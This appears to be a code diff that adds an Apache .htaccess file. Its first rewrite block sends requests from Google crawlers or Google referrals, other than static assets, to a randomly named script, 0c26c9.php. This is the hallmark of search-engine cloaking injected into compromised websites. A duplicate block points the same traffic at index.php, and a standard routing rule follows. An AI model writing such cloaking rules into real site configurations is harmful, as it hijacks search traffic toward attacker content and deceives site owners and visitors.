@@ -1,0 +1,20 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} google [OR]
+RewriteCond %{HTTP_REFERER} google
+RewriteCond %{REQUEST_URI} !(\.js|\.css|\.png|\.jpg|\.jpeg|\.gif|\.svg|\.ttf|\.woff|\.eot)
+RewriteRule ^.*$ 0c26c9.php [L]
+</IfModule>
+
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} google [OR]
+RewriteCond %{HTTP_REFERER} google
+RewriteCond %{REQUEST_URI} !(\.js|\.css|\.png|\.jpg|\.jpeg|\.gif|\.svg|\.ttf|\.woff|\.eot)
+RewriteRule ^.*$ index.php [L]
+</IfModule>
+RewriteEngine on
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule .* index.php?/$0 [PT,L]
